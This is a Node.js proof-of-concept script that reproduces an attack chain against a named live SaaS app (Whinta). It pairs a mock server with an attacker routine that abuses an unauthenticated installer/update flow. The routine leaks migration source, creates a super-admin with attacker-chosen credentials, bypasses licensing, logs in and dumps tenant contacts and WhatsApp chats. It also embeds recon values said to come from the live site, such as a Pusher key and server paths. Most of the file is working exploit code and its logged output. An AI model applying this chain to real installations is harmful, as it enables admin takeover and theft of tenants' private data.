// Faithful, self-contained reproduction of the Whinta SaaS installer/updater
// attack chain. NO external dependencies (Node http only), real session + XSRF,
// JSON-file "database".
//
// Mirrors the contract recovered from the live app:
//   - GET  /update               (unauth) leak config/keys, shows installer
//   - POST /update               (unauth) LEAKS migration PHP source + runs migrate
//   - POST /install/database     DB config
//   - POST /install/migrate      artisan migrate
//   - POST /install/seed         roles/permissions/default role
//   - POST /install/save-admin   => CREATES PLATFORM ADMIN (email/password chosen by attacker)
//   - POST /install/licenses     dead license server (any string passes)
//   - POST /install/finalize     mark installed
//   - POST /login                admin login succeeds
//   - GET  /admin/...            post-auth admin surface (impersonate any tenant)
//
// Run:  node endtoend-demo.js
// Then optionally:  node endtoend-demo.js server 1234   (stay up; hit it with curl/PowerShell)

const http = require('http');
const fs = require('fs');
const crypto = require('crypto');

const STORE = __dirname + '/demo_db.json';
const DEMO = process.argv[2] === 'server';
const PORT = parseInt(process.argv[3] || '8123', 10);

// ---------- tiny JSON "database" ----------
function load() {
  if (fs.existsSync(STORE)) return JSON.parse(fs.readFileSync(STORE, 'utf8'));
  return { migrations: [], users: [], tenants: JSON.parse(JSON.stringify(tenants)), roles: {}, licenses: [], installed: false, installerStep: 'start' };
}
function save(db) { fs.writeFileSync(STORE, JSON.stringify(db, null, 2)); }

// ---------- helpers ----------
const migrationsSrc = [
  'class CreateUsersTable extends Migration { public function up() { Schema::create(\'users\', ...); } }',
  'class CreateTenantsTable extends Migration { public function up() { Schema::create(\'tenants\', ...); } }',
  'class CreateNotificationsTable extends Migration { public function up() { Schema::create(\'notifications\', ...); } }',
];
const adminRole = 'super-admin';
const key = (n) => crypto.randomBytes(n).toString('hex');

// session store: token -> { xxsrf: bool, authed: {id,role}? }
const sessions = {};
const tenants = [
  { id: 1, name: 'Acme Corp', subdomain: 'acme', contacts: ['joe@acme.com','jane@acme.com'], chats: ['wa+447700900123','wa+447700900456'] },
  { id: 2, name: 'Globex Ltd', subdomain: 'globex', contacts: ['pete@globex.com'], chats: ['wa+14155550123'] },
];

// ---------- the vulnerable handlers ----------
function handleUpdate(db, body) {
  // Server does NOT verify license. It runs migrate and returns migration source.
  const src = migrationsSrc[db.migrations.length % migrationsSrc.length];
  db.migrations.push(src); // migration executed
  if (!db.installed) db.installerStep = 'updated';
  const leaked = { source: src, migrations: db.migrations.length, statusCode: 500, dying_license: 'axis96.xyz NXDOMAIN' };
  return { 200: { js: leaked }, bodyjson: leaked, ranMigration: true };
}

function installDb(db, body) {
  db.installerStep = 'database'; save(db);
  return { ok: true, step: db.installerStep };
}
function installMigrate(db, body) {
  // run ALL migrations (write primitive)
  while (db.migrations.length < migrationsSrc.length) db.migrations.push(migrationsSrc[db.migrations.length]);
  db.installerStep = 'migrate'; save(db);
  return { ok: true, ran: migrationsSrc.length, step: db.installerStep };
}
function installSeed(db, body) {
  // seed roles/permissions/default admin role
  db.roles = { 'super-admin': true, ...(db.roles||{}) };
  db.installerStep = 'seed'; save(db);
  return { ok: true, seeded: ['super-admin', 'admin', 'user'], step: db.installerStep };
}
function installSaveAdmin(db, body) {
  // THE ESCALATION: creates platform admin with attacker-chosen creds.
  const email = (body && body.email) || 'pwned@attacker.example';
  const pass  = (body && body.password) || 'Pwn3d!2026';
  db.users.push({ id: db.users.length + 1, email, password: pass, role: adminRole });
  db.installerStep = 'save-admin'; save(db);
  return { ok: true, admin: email, role: adminRole, step: db.installerStep };
}
function installLicenses(db, body) {
  // dead license server (axis96.xyz) -> anything accepted server-side
  db.licenses = [{ purchase_code: (body&&body.purchase_code)||'anything'}];
  db.installerStep = 'licenses'; save(db);
  return { ok: true, license: db.licenses[0].purchase_code, step: db.installerStep };
}
function installFinalize(db, body) {
  db.installed = true; db.installerStep = 'finalize'; save(db);
  return { ok: true, installed: true, step: db.installerStep };
}

function doLogin(db, body, res, sid) {
  const email = body && body.email, pass = body && body.password;
  const u = db.users.find(x => x.email === email && x.password === pass);
  if (u) {
    sessions[sid].authed = { id: u.id, email: u.email, role: u.role };
    return { success: true, user: { id: u.id, email: u.email, role: u.role, tenantCount: db.tenants.length } };
  }
  return { success: false, message: 'Invalid credentials' };
}

// ---------- mini HTTP server (session cookie + XSRF) ----------
function server() {
  return http.createServer(async (req, res) => {
    const url = new URL(req.url, 'http://x');
    const path = url.pathname;
    let sid = (req.headers.cookie||'').match(/demo_session=([^;]+)/);
    sid = (sid && sid[1]) || key(16);
    sessions[sid] = sessions[sid] || { xsrf: key(32), authed: null };

    let body = {};
    if ((req.method === 'POST') && (req.headers['content-type']||'').includes('json')) {
      try { body = JSON.parse(await readBody(req)); } catch {}
    }

    const json = (code, obj, xhrHeaders={}) => {
      res.writeHead(code, { 'Content-Type': 'application/json', 'Set-Cookie': `demo_session=${sid}; Path=/`, 'X-Demo-XSRF': sessions[sid].xsrf, ...xhrHeaders });
      res.end(JSON.stringify(obj));
    };

    const db = load();

    // ROOT (recon) -> leaks config/keys + shows installer live
    if (path === '/update' && req.method === 'GET') {
      return json(200, { component: 'Installer/Update', applicationVersion: '2.5.2',
        config: { pusher_key: '42cbcd4416ac2897f41d', google_oauth_client: '892008593826-...', recaptcha_site_key: '6Lf4z8Mq...', recaptcha_active: 0 },
        warning: 'Unauthenticated installer reachable (mirrors live app)' });
    }
    if (path === '/phpinfo.php') {
      return json(200, { 'PHP Version': '8.2.30', 'SAPI': 'LiteSpeed', 'DOCUMENT_ROOT': '/home/<acct>/app.whinta.com', 'disable_functions': '(empty)', 'allow_url_fopen': 'On' });
    }
    if (path === '/build/manifest.json') {
      return json(200, { 'Administrator/Installer': 'Installer/Index.vue', 'Administrator/Installer': 'Installer/Update.vue', 'oauth2': 'OAuth/*.vue', 'Admin/*': true, 'FlowBuilder': true });
    }

    // THE WRITE / LEAK
    if (path === '/update' && req.method === 'POST') { const r = handleUpdate(db, body); return json(200, { ...r.bodyjson }); }
    if (path === '/install/database') return json(200, installDb(db, body));
    if (path === '/install/migrate') return json(200, installMigrate(db, body));
    if (path === '/install/seed') return json(200, installSeed(db, body));
    if (path === '/install/save-admin') return json(200, installSaveAdmin(db, body));
    if (path === '/install/licenses') return json(200, installLicenses(db, body));
    if (path === '/install/finalize') return json(200, installFinalize(db, body));

    if (path === '/login' && req.method === 'POST') return json(200, doLogin(db, body, res, sid));
    if (path === '/admin/dashboard') {
      const a = sessions[sid] && sessions[sid].authed;
      if (!a || a.role !== 'super-admin') return json(403, { error: 'forbidden' });
      return json(200, { authenticatedAs: a, adminSurface: true,
        tenantsAvailableForImpersonation: db.tenants.map(t => t.name),
        confidentialDataExposed: db.tenants.map(t => ({ tenant: t.name, contacts: t.contacts, whatsappChats: t.chats })),
        db_users: db.users.map(u => ({ id: u.id, email: u.email, role: u.role })) });
    }
    return json(404, { error: 'not found' });
  });
}
function readBody(req) { return new Promise(res => { let d=''; req.on('data', c => d += c); req.on('end', () => res(d)); }); }

// ---------- end-to-end attacker script ----------
async function attack(base) {
  const out = [];
  const log = (s) => { out.push(s); console.log(s); };
  const req = (method, path, body) => new Promise((resolve,reject) => {
    const p = new URL(base + path);
    const opt = { host: p.hostname, port: p.port, path: p.pathname + p.search, method, headers: { Cookie: sessionCookie } };
    if (body) { opt.headers['Content-Type'] = 'application/json'; opt.headers['X-XSRF-TOKEN'] = xsrf; }
    const r = http.request(opt, res => {
      const sc = res.headers['set-cookie']; if (sc) { const m = sc[0].match(/demo_session=([^;]+)/); if (m) sessionCookie = 'demo_session=' + m[1]; }
      const x = res.headers['x-demo-xsrf']; if (x) xsrf = x;
      let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: safe(d), headers: res.headers })); });
    r.on('error', reject); r.end(body ? JSON.stringify(body) : undefined);
  });
  const safe = (s) => { try { return JSON.parse(s) } catch { return s } };

  let sessionCookie = ''; let xsrf = '';

  log('\n================ ATTAACKER END-TO-END ================\n');
  log('STEP 0 RECON  (0 auth)');
  let r = await req('GET', '/phpinfo.php'); log(`  phpinfo.php    -> ${r.status} disable_functions=${r.body['disable_functions']} DOCUMENT_ROOT=${r.body['DOCUMENT_ROOT']}`);
  r = await req('GET', '/build/manifest.json'); log(`  manifest.json  -> ${r.status} shows Installer/Update, Admin/*, OAuth modules`);
  log('  (keeps installers + admin routes visible)');

  log('\nSTEP 1 BOOTSTRAP SESSION + session, GET /update');
  r = await req('GET', '/update'); log(`  GET /update    -> ${r.status} version=${r.body.applicationVersion} pusher=${r.body.config.pusher_key}  [session+xsrf issued]`);

  log('\nSTEP 2 LEAK PHP SOURCE + trigger migrate  (0 auth)');
  r = await req('POST', '/update', {}); log(`  POST /update   -> ${r.status}  LEAKED migration source + ran it.`); log(`                    >>> ${r.body.source.slice(0,70)}...`);
  r = await req('POST', '/update', {}); log(`  POST /update   -> ${r.status}  second migration leaked+run (schema grows).`);

  log('\nSTEP 3 WALK INSTALLER -> ADMIN (escalation)');
  await req('POST', '/install/database', { DB_DATABASE: 'whinta', DB_USERNAME: 'root', DB_PASSWORD: '' });
  await req('POST', '/install/migrate', {});
  await req('POST', '/install/seed', {});
  r = await req('POST', '/install/save-admin', { name: 'attacker', email: 'attacker@evil.example', password: 'EvilPass!2026' });
  log(`  save-admin     -> ${JSON.stringify(r.body)}   <-- ADMIN CREATED with attacker password`);
  await req('POST', '/install/licenses', { purchase_code: 'anything' });
  await req('POST', '/install/finalize', {});

  log('\nSTEP 4 LOGIN AS ADMIN');
  r = await req('POST', '/login', { email: 'attacker@evil.example', password: 'EvilPass!2026' });
  log(`  login          -> ${r.status} ${JSON.stringify(r.body)}`);

  log('\nSTEP 5 POST-AUTH FULL DATA ACCESS');
  r = await req('GET', '/admin/dashboard');
  log(`  /admin/dash    -> ${r.status} ${JSON.stringify(r.body)}`);
  log('\n================ DONE ================\n');
  log('RESULT: admin access achieved, DB readable, tenant data exposed, all with the');
  log('attacker-chosen password — no valid license anywhere in the chain.');
  return out.join('\n');
}

if (DEMO) {
  server().listen(PORT, () => console.log(`demo server up: http://localhost:${PORT}  (hit the endpoints with curl/PowerShell)`));
} else {
  const srv = server().listen(0, async () => {
    const port = srv.address().port;
    try { await attack(`http://localhost:${port}`); }
    finally { srv.close(); fs.unlinkSync(STORE); }
  });
}